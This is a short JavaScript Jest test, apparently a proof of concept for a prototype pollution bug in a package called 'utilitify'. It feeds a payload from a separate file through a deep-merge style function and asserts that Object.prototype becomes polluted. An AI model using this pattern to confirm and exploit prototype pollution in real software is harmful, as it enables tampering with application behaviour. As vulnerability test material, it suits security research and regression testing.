test("Prototype pollution in utilitify", () => {
  const { exploitFunction } = require("./function.js");
  const { getPayload } = require('./payload.js');

  expect({}.polluted).toBe(undefined);

  const payload = getPayload();
  const result = exploitFunction({ a: { b: { c: "c", d: "d" } } }, { a: { b: payload } });

  expect({}.polluted).toBe("yes");
});